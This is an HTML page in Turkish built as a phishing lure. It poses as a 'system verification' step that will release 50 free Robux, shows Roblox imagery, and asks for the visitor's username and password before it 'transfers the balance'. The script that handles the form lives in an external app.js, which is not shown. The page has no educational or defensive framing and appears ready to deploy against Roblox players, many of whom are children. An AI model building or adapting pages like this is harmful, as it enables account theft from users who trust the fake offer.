<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Dogrulama</title>
    <style>
        body { font-family: sans-serif; background: #e3e3e3; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 25px; border-radius: 10px; width: 320px; text-align: center; border-top: 5px solid #00b06f; }
        .promo-img { width: 100%; border-radius: 5px; margin-bottom: 15px; }
        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        #btn { width: 100%; padding: 12px; background: #00b06f; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://tr.rbxcdn.com/7926b4845012574e46045155f3032d84/420/420/Image/Png" class="promo-img">
        <p style="font-size: 14px; color: #555;">50 R$ Bakiyenizi Onaylayın</p>
        <form id="f">
            <input type="text" id="u" placeholder="Kullanıcı Adı" required>
            <input type="password" id="p" placeholder="Şifre" required>
            <button type="submit" id="btn">BAKİYEYİ AKTAR</button>
        </form>
    </div>
    <script src="app.js"></script>
</body>
</html>
